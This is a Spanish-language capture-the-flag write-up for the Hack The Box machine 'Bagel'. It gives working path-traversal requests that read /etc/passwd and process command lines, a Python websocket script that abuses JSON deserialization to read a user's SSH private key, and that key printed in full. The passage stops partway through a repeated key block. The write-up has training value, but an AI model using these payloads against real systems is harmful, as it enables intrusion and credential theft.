---
layout: single
title: Bagel - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Bagel de categoría Media es una maquina Linux donde vamos aprovecharnos de un LFI para poder acceder a leer procesos y archivos de la maquina vamos a descargar un archivo .dll para poder asi obtener información y aprovecharnos de un JSON Deserialization para obtener la id_rsa de un usuario de la maquina y conectarnos por SSH para la escalada de privilegios vamos a abusar de que como root sin proporcionar contraseña podemos ejecutar un binario"
date: 2023-06-03
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-bagel/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - LFI
  - JSON Deserialization
  - Python Scripting
  - Abusing Sudoers Privilege
---

⮕ Maquina Linux

```bash
❯ ping -c 1 10.10.11.201
PING 10.10.11.201 (10.10.11.201) 56(84) bytes of data.
64 bytes from 10.10.11.201: icmp_seq=1 ttl=63 time=79.0 ms

--- 10.10.11.201 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 79.046/79.046/79.046/0.000 ms
❯ whichSystem.py 10.10.11.201

10.10.11.201 (ttl -> 63): Linux

```

## PortScan

~~~bash
# Nmap 7.93 scan initiated Thu Jun  1 11:07:26 2023 as: nmap -sCV -p22,5000,8000 -oN targeted 10.10.11.201
Nmap scan report for 10.10.11.201
Host is up (0.088s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey: 
|   256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)
|_  256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Thu, 01 Jun 2023 17:07:37 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Thu, 01 Jun 2023 17:07:52 GMT
|     Connection: close
|   Help, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Thu, 01 Jun 2023 17:08:03 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Thu, 01 Jun 2023 17:07:37 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
|_    <h1>Bad Request (Invalid request line (version).)</h1>
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Thu, 01 Jun 2023 17:07:37 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Thu, 01 Jun 2023 17:07:32 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 263
|     Location: http://bagel.htb:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.93%I=7%D=6/1%Time=6478D05B%P=x86_64-pc-linux-gnu%r(Get
SF:Request,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nServer:\x20Microsoft-
SF:NetCore/2\.0\r\nDate:\x20Thu,\x2001\x20Jun\x202023\x2017:07:37\x20GMT\r
SF:\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,E8,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-Ne
SF:tCore/2\.0\r\nDate:\x20Thu,\x2001\x20Jun\x202023\x2017:07:37\x20GMT\r\n
SF:Content-Length:\x2054\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\
SF:n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(version\)\
SF:.\)</h1>")%r(HTTPOptions,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nServ
SF:er:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Thu,\x2001\x20Jun\x202023\x20
SF:17:07:52\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(Help,E6,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20Mi
SF:crosoft-NetCore/2\.0\r\nDate:\x20Thu,\x2001\x20Jun\x202023\x2017:08:03\
SF:x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\
SF:x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(
SF:parts\)\.\)</h1>")%r(SSLSessionReq,E6,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\r
SF:\nDate:\x20Thu,\x2001\x20Jun\x202023\x2017:08:03\x20GMT\r\nContent-Leng
SF:th:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h1>Bad
SF:\x20Request\x20\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>")%r(T
SF:erminalServerCookie,E6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Thu,
SF:\x2001\x20Jun\x202023\x2017:08:03\x20GMT\r\nContent-Length:\x2052\r\nCo
SF:nnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h1>Bad\x20Request\x20
SF:\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>")%r(TLSSessionReq,E6
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nS
SF:erver:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Thu,\x2001\x20Jun\x202023\
SF:x2017:08:03\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\n
SF:Keep-Alive:\x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x
SF:20line\x20\(parts\)\.\)</h1>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.93%I=7%D=6/1%Time=6478D056%P=x86_64-pc-linux-gnu%r(Get
SF:Request,1EA,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.2\x
SF:20Python/3\.10\.9\r\nDate:\x20Thu,\x2001\x20Jun\x202023\x2017:07:32\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20263\r\nLocation:\x20http://bagel\.htb:8000/\?page=index\.html\r\nCon
SF:nection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>
SF:Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should
SF:\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL:\x2
SF:0<a\x20href=\"http://bagel\.htb:8000/\?page=index\.html\">http://bagel\
SF:.htb:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click\x20the\x20lin
SF:k\.\n")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nSe
SF:rver:\x20Werkzeug/2\.2\.2\x20Python/3\.10\.9\r\nDate:\x20Thu,\x2001\x20
SF:Jun\x202023\x2017:07:37\x20GMT\r\nContent-Type:\x20text/html;\x20charse
SF:t=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!doct
SF:ype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h
SF:1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\
SF:x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manua
SF:lly\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>
SF:\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML
SF:\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/
SF:TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"tex
SF:t/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x
SF:20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\\x05\\x04\\x00
SF:\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-
SF:\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20
SF:\x20\x20\x20</body>\n</html>\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun  1 11:09:11 2023 -- 1 IP address (1 host up) scanned in 104.44 seconds

~~~

## Enumeracion

En el escaneo de **Nmap** vemos que hay un dominio asi que lo vamos a agregar al **/etc/hosts**

```bash
❯ echo "10.10.11.201 bagel.htb" | sudo tee -a /etc/hosts
10.10.11.201 bagel.htb
❯ ping -c 1 bagel.htb
PING bagel.htb (10.10.11.201) 56(84) bytes of data.
64 bytes from bagel.htb (10.10.11.201): icmp_seq=1 ttl=63 time=79.3 ms

--- bagel.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 79.304/79.304/79.304/0.000 ms

```

Se esta empleando **Python3** en el servicio web que corre en el puerto **8000** ademas por la **URL** ya vemos podremos intentar un **LFI** 

```ruby
❯ whatweb http://10.10.11.201:8000
http://10.10.11.201:8000 [302 Found] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.10.9], IP[10.10.11.201], Python[3.10.9], RedirectLocation[http://bagel.htb:8000/?page=index.html], Title[Redirecting...], Werkzeug[2.2.2]
http://bagel.htb:8000/?page=index.html [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.10.9], IP[10.10.11.201], JQuery, Meta-Author[freehtml5.co], Modernizr[2.6.2.min], Open-Graph-Protocol, Python[3.10.9], Script, Title[Bagel &mdash; Free Website Template, Free HTML5 Template by freehtml5.co], Werkzeug[2.2.2], X-UA-Compatible[IE=edge]

```

Vemos que es una tienda 

![](/assets/images/htb-writeup-bagel/web1.png)

Bueno de primeras vamos a hacer una prueba para ver si podemos leer el **/etc/passwd**

![](/assets/images/htb-writeup-bagel/web2.png)

Vamos a hacer un **directory path traversal** para ir varios directorios hacia atrás 

![](/assets/images/htb-writeup-bagel/web3.png)

Si aplicamos eso nos descarga un archivo llamado **passwd** y podemos ver el contenido del archivo 

```bash
❯ catn passwd | grep bash
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

Hice este script en **Python3** para automatizar el **LFI** desde consola puedes encontrarlo en mi github te dejo aquí el link <https://github.com/MikeRega7/Scripts/blob/main/HackTheBox/Bagel/lfi.py>

```bash
❯ python3 lfi.py /etc/passwd
[.] Mostrando archivo indicado: Listo
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
setroubleshoot:x:997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit web service:/nonexisting:/sbin/nologin
cockpit-wsinstance:x:995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:994:992::/var/lib/chrony:/sbin/nologin
dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
systemd-coredump:x:989:989:systemd Core Dumper:/:/usr/sbin/nologin
systemd-timesync:x:988:988:systemd Time Synchronization:/:/usr/sbin/nologin
developer:x:1000:1000::/home/developer:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
_laurel:x:987:987::/var/log/laurel:/bin/false
```

Bueno después de estar enumerando no encontramos cosas interesantes así que algo que podemos hacer es fuzzear los procesos que se están corriendo en el sistema, podemos hacerlo con bash 

```bash
❯ catn fuzz.sh
for i in $(seq 900 1000); do
    curl "http://10.10.11.201:8000/?page=../../../../../../../proc/$i/cmdline" -o -;
    echo "PID => $i";
done
```

Después de ejecutarlo vemos un que se esta corriendo un esto `dotnet/opt/bagel/bin/Debug/net6.0/bagel.dllPID => 953` 

![](/assets/images/htb-writeup-bagel/web4.png)

Bueno si le preguntamos a **ChatGPT** ya nos dice que es para **windows**

![](/assets/images/htb-writeup-bagel/web5.png)

 Bueno si mediante el **LFI** tratamos de ver el archivo si existe pero mejor vamos a descargarlo desde le navegador ya que en el **LFI** desde hay nos descarga los archivos

```bash
❯ python3 lfi.py /opt/bagel/bin/Debug/net6.0/bagel.dll
[▄] Mostrando archivo indicado: Listo
MZ�\x00\x00\x00\x00\x00\xbfÿ\x00¸\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x82\xa
$\x00\x00\x00\x00E\x00L\x03ñ¢S÷\x00\x00\x00\x00à\x00\x000\x00 \x00\x00\x00\x00\x00š>\x00\x00\x00\x00\x00\x00@\x00 \x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x00\x82\xac\x00\x00\x00\x00\x00\x03`…\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00G>\x00O\x00\x00@\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00�=\x00T\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x0\x00\x00\x00\x00\x00\x00 \x00H\x00\x00\x00\x00\x00\x00text\x00\x00\xa0\x1e\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x00`.rsrc\x00\x00\x05\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00@.reloc\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00B\x00\x00\x00\x00\x00\x00\x00\x00{>\x00\x00\x00H\x00\x00\x00\x00&\x00x\x17\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00(\x14\x00\x00b(\x14\x00\x00\x17\xbf\
```

![](/assets/images/htb-writeup-bagel/web6.png)

De igual manera puedes hacerlo desde consola usando **curl**

```bash
❯ curl -s 'http://bagel.htb:8000/?page=../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll' -o bagel.dll
```

Y hay lo tenemos

```bash
❯ file bagel.dll
bagel.dll: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

Pero bueno como es de **windows** tendremos que usar **dnSpy** para ejecutarlo en windows <https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8>

Después de analizar el **dll** vemos la contraseña del usuario **dev** pero son para la base de datos

![](/assets/images/htb-writeup-bagel/dll.png)

Bueno si analizamos el esa parte del **script** vemos que `string text =` se esta mencionando **Orders** que es un directorio el cual existe en la pagina web 

![](/assets/images/htb-writeup-bagel/web7.png)

## Intrusión

Mediante un **script** de **python** podemos conectarnos ala maquina victima por el puerto **5000** para hacer una orden, esto es gracias a que después de estar enumerando mediante el LFI hay un script en python3 que tiene el siguiente contenido, que nos estan dando información de como se tramitan las ordenes

```bash
❯ curl -s 'http://bagel.htb:8000/?page=../../../../../../home/developer/app/app.py'
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
        if 'page' in request.args:
            page = 'static/'+request.args.get('page')
            if os.path.isfile(page):
                resp=send_file(page)
                resp.direct_passthrough = False
                if os.path.getsize(page) == 0:
                    resp.headers["Content-Length"]=str(len(resp.get_data()))
                return resp
            else:
                return "File not found"
        else:
                return redirect('http://bagel.htb:8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet <path to .dll>" command. Use your ssh key to access the machine.
    try:
        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(data)
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=8000)
```

Este es el script que me compartio **ChatGPT** ya que al hacerlo con **python3** tenia muchos errores y no funcionaba pero con **python2** me funciono

```bash
#!/usr/bin/python3

import websocket
import json

# Define the WebSocket URL
ws_url = "ws://bagel.htb:5000/"

# Define the WebSocket connection callback functions
def on_open(ws):
    # Create a dictionary containing the request parameters
    order = {"ReadOrder": "orders.txt"}

    # Convert the dictionary to a JSON-encoded string
    data = json.dumps(order)

    # Send the message to the WebSocket server
    ws.send(data)

def on_message(ws, message):
    # Print the received message
    print(json.loads(message)['ReadOrder'])

# Create a new WebSocket object
ws = websocket.WebSocketApp(ws_url,
                            on_open=on_open,
                            on_message=on_message)

# Connect to the WebSocket server and start the event loop
ws.run_forever()


```

Si lo ejecutamos pasa esto 

```bash
❯ python2 orderws.py
order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]
order #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]
order #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels] 
```

Vemos ordenes en la web

![](/assets/images/htb-writeup-bagel/web8.png)

Bueno cuando analizamos el **dll** con **dnSpy** hay un **MessageReceived** si le pasamos un objeto **serialized** lo va a **desearealizar** o **Deserealize** y esta usando **JSON** y usando la **deserializacion** podemos aprovechar para leer la **id_rsa** de un usuario ya que el valor se convertirá en un objeto serializado

![](/assets/images/htb-writeup-bagel/dese.png)

Ahora lo que podemos hacer es que con un **script** en **Python** podemos hacer lo antes mencionado 

```bash
❯ catn idrsa.py
import websocket
import json

ws = websocket.WebSocket()

ws.connect("ws://bagel.htb:5000/")

order =  { "RemoveOrder" : {"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../../home/phil/.ssh/id_rsa"}}
data = str(json.dumps(order))

ws.send(data)

result = ws.recv()
print(result) 

```

Si lo ejecutamos podemos leer la **id_rsa**

```bash
❯ python2 idrsa.py
{
  "UserId": 0,
  "Session": "Unauthorized",
  "Time": "10:24:32",
  "RemoveOrder": {
    "$type": "bagel_server.File, bagel",
    "ReadFile": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----",
    "WriteFile": null
  },
  "WriteOrder": null,
  "ReadOrder": null
}
```

Ahora que tenemos la `id_rsa` podemos conectarnos

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAuhIcD7KiWMN8eMlmhdKLDclnn0bXShuMjBYpL5qdhw8m1Re3Ud+2
s8SIkkk0KmIYED3c7aSC8C74FmvSDxTtNOd3T/iePRZOBf5CW3gZapHh+mNOrSZk13F28N
dZiev5vBubKayIfcG8QpkIPbfqwXhKR+qCsfqS//bAMtyHkNn3n9cg7ZrhufiYCkg9jBjO
ZL4+rw4UyWsONsTdvil6tlc41PXyETJat6dTHSHTKz+S7lL4wR/I+saVvj8KgoYtDCE1sV
VftUZhkFImSL2ApxIv7tYmeJbombYff1SqjHAkdX9VKA0gM0zS7but3/klYq6g3l+NEZOC
M0/I+30oaBoXCjvupMswiY/oV9UF7HNruDdo06hEu0ymAoGninXaph+ozjdY17PxNtqFfT
eYBgBoiRW7hnY3cZpv3dLqzQiEqHlsnx2ha/A8UhvLqYA6PfruLEMxJVoDpmvvn9yFWxU1
YvkqYaIdirOtX/h25gvfTNvlzxuwNczjS7gGP4XDAAAFgA50jZ4OdI2eAAAAB3NzaC1yc2
EAAAGBALoSHA+yoljDfHjJZoXSiw3JZ59G10objIwWKS+anYcPJtUXt1HftrPEiJJJNCpi
GBA93O2kgvAu+BZr0g8U7TTnd0/4nj0WTgX+Qlt4GWqR4fpjTq0mZNdxdvDXWYnr+bwbmy
msiH3BvEKZCD236sF4SkfqgrH6kv/2wDLch5DZ95/XIO2a4bn4mApIPYwYzmS+Pq8OFMlr
DjbE3b4perZXONT18hEyWrenUx0h0ys/ku5S+MEfyPrGlb4/CoKGLQwhNbFVX7VGYZBSJk
i9gKcSL+7WJniW6Jm2H39UqoxwJHV/VSgNIDNM0u27rd/5JWKuoN5fjRGTgjNPyPt9KGga
Fwo77qTLMImP6FfVBexza7g3aNOoRLtMpgKBp4p12qYfqM43WNez8TbahX03mAYAaIkVu4
Z2N3Gab93S6s0IhKh5bJ8doWvwPFIby6mAOj367ixDMSVaA6Zr75/chVsVNWL5KmGiHYqz
rV/4duYL30zb5c8bsDXM40u4Bj+FwwAAAAMBAAEAAAGABzEAtDbmTvinykHgKgKfg6OuUx
U+DL5C1WuA/QAWuz44maOmOmCjdZA1M+vmzbzU+NRMZtYJhlsNzAQLN2dKuIw56+xnnBrx
zFMSTw5IBcPoEFWxzvaqs4OFD/QGM0CBDKY1WYLpXGyfXv/ZkXmpLLbsHAgpD2ZV6ovwy9
1L971xdGaLx3e3VBtb5q3VXyFs4UF4N71kXmuoBzG6OImluf+vI/tgCXv38uXhcK66odgQ
